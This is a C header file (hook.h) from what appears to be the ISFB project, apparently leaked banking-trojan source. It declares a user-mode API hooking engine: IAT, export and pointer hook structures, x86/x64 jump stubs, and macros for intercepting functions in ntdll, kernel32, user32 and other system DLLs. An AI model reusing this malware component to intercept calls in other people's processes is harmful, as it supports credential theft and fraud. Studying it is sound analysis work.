//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: hook.h
// $Revision: 311 $
// $Date: 2014-08-27 11:41:52 +0400 (Ср, 27 авг 2014) $
// description: 
//	User-mode hoking engine implementation.

#pragma once

// Hook flags
#define HF_SET				0x100
#define	HF_PATCH_NAME		0x200

// Hook types
#define HF_TYPE_IAT			1
#define HF_TYPE_EXPORT		2
#define	HF_TYPE_PTR			4
#define	HF_TYPE_NAME		8
#define HF_TYPE_MASK		0xff

typedef struct _HOOK_FUNCTION
{
	PCHAR		HokedModule;	// Name of a module where HookedFunction located (exported)
	union {
		PCHAR		HookedFunction;	// Name of a hooked function
		PIAT_ENTRY	pHookedFunction;
	};
	PVOID		HookFn;			// Hook function
	PVOID		Stub;			// Address of hook stub if used.
	PVOID		Original;		// Address of the original function
} HOOK_FUNCTION, *PHOOK_FUNCTION;

// Hook structures
typedef struct _HOOK
{
	LIST_ENTRY		Entry;			// Hook list entry
	PVOID			OriginalFn;		// Original function
	PVOID			OriginalEntry;	// Original function entry (for IAT or Export hooks)
	ULONG_PTR		OriginalValue;	// Original value for IDT and Export hooks
	PVOID			HookFn;			// Address of the current hook function
	PHOOK_FUNCTION	pHookFn;		// Pointer to a hook function descriptor structure
	ULONG			Flags;			// Hook flags
	PVOID			OriginalName;	// Pointer to the original function name

} HOOK, *PHOOK;

typedef struct _HOOK_DESCRIPTOR
{
	PHOOK_FUNCTION	pHookFn;
	PHOOK			pHook;		// Pointer to associated HOOK structure, filed internally by a hooking function
	ULONG			Flags;		// Hook flags (hooking type etc.)
}HOOK_DESCRIPTOR, *PHOOK_DESCRIPTOR;

// Describes number of IAT hooks that should be set on every DLL load
typedef struct _HOOK_DLL_LOAD_NOTIFICATION
{
	LIST_ENTRY			Entry;
	PVOID				pNotificationDescriptor;
	PHOOK_DESCRIPTOR	pHookDescriptor;
	ULONG				NumberHooks;
} HOOK_DLL_LOAD_NOTIFICATION, *PHOOK_DLL_LOAD_NOTIFICATION;


#define OP_JMP_NEAR			0xe9
#define OP_JMP_DWORD_PTR	0x25ff

#pragma pack(push)
#pragma pack(1)
typedef struct _JMP_STUB32
{
	// JMP NEAR XXXX instruction
	UCHAR	Opcode;		// must be 0xe9
	ULONG	Offset;		// jump offset
} JMP_STUB32, *PJMP_STUB32;

typedef struct _JMP_STUB64
{
	// JMP QWORD PTR [$+6]/DQ XXXXXXXX instructions
	USHORT		Opcode;		// must be 0x25ff
	ULONG		Offset;		// must be 0
	ULONG_PTR	Address;	// jump address
} JMP_STUB64, *PJMP_STUB64;


#ifdef _WIN64
	typedef 	JMP_STUB64			JMP_STUB;
	typedef 	PJMP_STUB64			PJMP_STUB;
	#define		JMP_STUB_OPCODE		OP_JMP_DWORD_PTR

#else
	typedef		JMP_STUB32			JMP_STUB;
	typedef		PJMP_STUB32			PJMP_STUB;
	#define		JMP_STUB_OPCODE		OP_JMP_NEAR
#endif

#define OP_POP_EAX 0x58
#define OP_PUSH_DWORD 0x68
#define OP_PUSH_EAX 0x50

// hook struct should be before the stub
typedef struct _CALL_STUB
{
	UCHAR	OpPopEax;		// must be 0x58
	UCHAR	OpPushDword;		// must be 0x68
	ULONG	Ptr;
	UCHAR	OpPushEax;		// must be 0x50
	JMP_STUB Jump;
}CALL_STUB,*PCALL_STUB;

typedef struct _CALL_HOOK
{
	LIST_ENTRY	Entry;			// Hook list entry
	PVOID		OriginalFn;		// Original function
	PVOID		HookFn;
	PVOID		StubFn;
	PVOID		Context;
	PVOID		WndLong; // result of getwindowlong after subclassing
	BOOL		bIsDialog;
	BOOL		bIsModal;
	BOOL		bDeleted;
	BOOL		bReset; // style has been reset
#ifdef _X86_
	CALL_STUB	Stub;
#else
	CHAR Stub[1];
#endif
}CALL_HOOK,*PCALL_HOOK;

#pragma pack(pop)


// Definition of a HOOK_DESCRIPTOR structure
#define DEFINE_HOOK(pHookFn, HookingType)	\
	{pHookFn, NULL, HookingType}
	

// Functions
WINERROR	InitHooks(VOID);
VOID		CleanupHooks(VOID);
WINERROR	SetIatHook(PHOOK_FUNCTION pHookFn, HMODULE ModuleBase, ULONG Flags, PHOOK* ppHook);
WINERROR	SetExportHook(PHOOK_FUNCTION pHookFn, HMODULE ModuleBase, BOOL bForward, ULONG Flags, PHOOK* ppHook);
WINERROR	SetPointerHook(PHOOK_FUNCTION pHookFn, PHOOK* ppHook);
WINERROR	SetMultipleHooks(PHOOK_DESCRIPTOR pHookDesc, LONG NumberHooks, HMODULE ModuleBase);
WINERROR	RemoveMultipleHooks(PHOOK_DESCRIPTOR pHookDesc, LONG NumberHooks);
ULONG		RemoveAllHooks(PHOOK_FUNCTION pHookFn);
VOID		WaitForHooks(VOID);

WINERROR SetOnDllLoadHooks(PHOOK_DESCRIPTOR	pHookDescriptor, ULONG NumberHooks);

PCALL_HOOK AllocateCallStub( PVOID HookFn,PVOID OriginalFn );

#define DECLARE_HOOK(DllName,FuncName) \
	HOOK_FUNCTION hook_##DllName_##FuncName = {#DllName ".dll", #FuncName, &my_##FuncName, NULL, NULL}

#define DECLARE_NT_HOOK(FuncName) \
	HOOK_FUNCTION hook_ntdll_##FuncName = {szNtdll, #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_A32_HOOK(FuncName) \
	HOOK_FUNCTION hook_advapi32_##FuncName = {szAdvapi32, #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_K32_HOOK(FuncName) \
	HOOK_FUNCTION hook_kernel32_##FuncName = {szKernel32, #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_U32_HOOK(FuncName) \
	HOOK_FUNCTION hook_user32_##FuncName = {"user32.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_G32_HOOK(FuncName) \
	HOOK_FUNCTION hook_gdi32_##FuncName = {"gdi32.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_DXGI_HOOK(FuncName) \
	HOOK_FUNCTION hook_dxgi_##FuncName = {"DXGI.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_WINMM_HOOK(FuncName) \
	HOOK_FUNCTION hook_winmm_##FuncName = {"Winmm.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_DSOUND_HOOK(FuncName) \
	HOOK_FUNCTION hook_dsound_##FuncName = {"dsound.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_OLE32_HOOK(FuncName) \
	HOOK_FUNCTION hook_ole32_##FuncName = {"ole32.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_SHELL32_HOOK(FuncName) \
	HOOK_FUNCTION hook_shell32_##FuncName = {"Shell32.dll", #FuncName, &my_##FuncName, NULL, NULL}
#define DECLARE_NULL_HOOK(FuncName) \
	HOOK_FUNCTION hook_null_##FuncName = {NULL, #FuncName, &my_##FuncName, NULL, NULL}

#define	DEFINE_NT_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HF_TYPE_IAT)
#define DEFINE_A32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_advapi32_##FuncName, HF_TYPE_IAT | HF_PATCH_NAME)
#define DEFINE_K32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_kernel32_##FuncName, HF_TYPE_IAT | HF_PATCH_NAME)
#define DEFINE_U32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_user32_##FuncName, HF_TYPE_IAT)
#define DEFINE_G32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_gdi32_##FuncName, HF_TYPE_IAT)
#define DEFINE_DXGI_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_dxgi_##FuncName, HF_TYPE_IAT)
#define DEFINE_WINMM_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_winmm_##FuncName, HF_TYPE_IAT)
#define DEFINE_DSOUND_IAT_HOOK(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HF_TYPE_IAT)
#define DEFINE_OLE32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_ole32_##FuncName, HF_TYPE_IAT)
#define DEFINE_SHELL32_IAT_HOOK(FuncName)	DEFINE_HOOK(&hook_shell32_##FuncName, HF_TYPE_IAT)
#define DEFINE_NULL_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_null_##FuncName, HF_TYPE_IAT | HF_PATCH_NAME)

#define DEFINE_NT_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_A32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_advapi32_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_K32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_kernel32_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_U32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_user32_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_G32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_gdi32_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_DXGI_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_dxgi_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_WINMM_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_winmm_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_DSOUND_EXP_HOOK(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_OLE32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_ole32_##FuncName, HF_TYPE_EXPORT)
#define DEFINE_SHELL32_EXP_HOOK(FuncName)	DEFINE_HOOK(&hook_shell32_##FuncName, HF_TYPE_EXPORT)

#define DEFINE_NT_PROC(FuncName)			((ptr_##FuncName)hook_nt_##FuncName.Original)
#define DEFINE_U32_PROC(FuncName)			((ptr_##FuncName)hook_user32_##FuncName.Original)
#define DEFINE_K32_PROC(FuncName)			((ptr_##FuncName)hook_kernel32_##FuncName.Original)
#define DEFINE_G32_PROC(FuncName)			((ptr_##FuncName)hook_gdi32_##FuncName.Original)
#define DEFINE_WINMM_PROC(FuncName)			((ptr_##FuncName)hook_winmm_##FuncName.Original)
#define DEFINE_DSOUND_PROC(FuncName)		((ptr_##FuncName)hook_dsound_##FuncName.Original)
#define DEFINE_OLE32_PROC(FuncName)			((ptr_##FuncName)hook_ole32_##FuncName.Original)
#define DEFINE_SHELL32_PROC(FuncName)		((ptr_##FuncName)hook_shell32_##FuncName.Original)

#define EXTERN_NT_HOOK(FuncName)			extern HOOK_FUNCTION hook_nt_##FuncName
#define EXTERN_U32_HOOK(FuncName)			extern HOOK_FUNCTION hook_user32_##FuncName
#define EXTERN_G32_HOOK(FuncName)			extern HOOK_FUNCTION hook_gdi32_##FuncName
#define EXTERN_K32_HOOK(FuncName)			extern HOOK_FUNCTION hook_kernel32_##FuncName
#define EXTERN_WINMM_HOOK(FuncName)			extern HOOK_FUNCTION hook_winmm_##FuncName
#define EXTERN_DSOUND_HOOK(FuncName)		extern HOOK_FUNCTION hook_dsound_##FuncName
#define EXTERN_OLE32_HOOK(FuncName)			extern HOOK_FUNCTION hook_ole32_##FuncName
#define EXTERN_SHELL32_HOOK(FuncName)		extern HOOK_FUNCTION hook_shell32_##FuncName


// Hooks

extern	LONG volatile	g_HookCount;
extern  BOOL volatile 	g_HookInit;

#define	ENTER_HOOK()	_InterlockedIncrement(&g_HookCount)
#define	LEAVE_HOOK()	_InterlockedDecrement(&g_HookCount)

_inline VOID WaitForHooks(VOID)
{
	do
	{
		SleepEx(100, TRUE);
	}while(g_HookCount);
}


// Workers

extern	LONG volatile	g_WorkerCount;

#define ENTER_WORKER()	_InterlockedIncrement(&g_WorkerCount)
#define LEAVE_WORKER()	_InterlockedDecrement(&g_WorkerCount)

_inline VOID WaitForWorkers(
	LONG Timeout	// milliseconds
	)
{
	do
	{
		SleepEx(100, TRUE);
	} while ((g_WorkerCount) && ((Timeout -= 100) > 0));
}